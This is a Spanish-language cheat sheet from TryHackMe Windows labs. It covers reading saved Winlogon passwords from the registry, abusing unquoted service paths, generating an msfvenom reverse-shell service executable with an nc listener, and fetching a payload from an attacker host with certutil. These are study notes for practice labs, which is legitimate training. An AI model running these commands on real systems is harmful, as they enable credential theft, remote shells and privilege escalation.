# Windows / THM — comandos rápidos

Notas sueltas de laboratorios de Windows (TryHackMe): escritorio remoto, credenciales en el registro, servicios con rutas débiles y transferencia de archivos.

## 1. Escritorio remoto (RDP)

Conexión con `xfreerdp`, ignorando el certificado, con portapapeles habilitado y una carpeta local compartida (`/share` queda montada como unidad en la víctima):

```
xfreerdp /v:IP_DEL_OBJETIVO /u:thmuser /p:'Password1!' /cert:ignore +clipboard /dynamic-resolution /drive:share,/share
```

## 2. Credenciales guardadas en el registro (Winlogon)

Windows guarda el usuario y la contraseña del último inicio de sesión en el registro:

```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Salida relevante:

```
DefaultUserName    REG_SZ    notadmin
DefaultPassword    REG_SZ    P@ssw0rd!
```

Con esas credenciales ejecutamos un comando elevado:

```
runas /user:privesc\notadmin cmd.exe
```

## 3. Servicios Windows y rutas débiles

Listamos los servicios instalados y filtramos por nombre para localizar el ejecutable y la cuenta con la que corre:

```
wmic service get name,pathname,startname | findstr /i "svcadmin"
```

Si la ruta del ejecutable no va entre comillas y contiene espacios, Windows ejecuta el primer binario que encuentre, lo que permite sustituirlo por un ejecutable propio.

Generamos el payload (versión servicio) y escuchamos:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.66.101.33 LPORT=4444 -f exe-service -o svc.exe
```

```
rlwrap nc -lvnp 4444
```

## 4. Transferencia de archivos

**Desde la unidad redirigida de RDP** (`TSCLIENT` es la carpeta que compartimos con `/drive`):

```
net use
copy \\TSCLIENT\_share\svc.exe C:\Windows\THMSVC\svc.exe
```

**Descarga directa desde nuestro servidor** con `certutil`:

```
certutil -urlcache -split -f http://10.66.101.33:8000/shell.exe C:\Windows\Tasks\shell.exe
```

## 5. Revisión de permisos de archivos

Comprobamos quién puede modificar un archivo antes de atacarlo:

```
icacls cleanup.bat
```

## 6. SMB con Impacket

Conexión a un recurso SMB de otro host con credenciales:

```
impacket-smbclient thm.loc/claire:'Password123!'@192.168.11.51
```
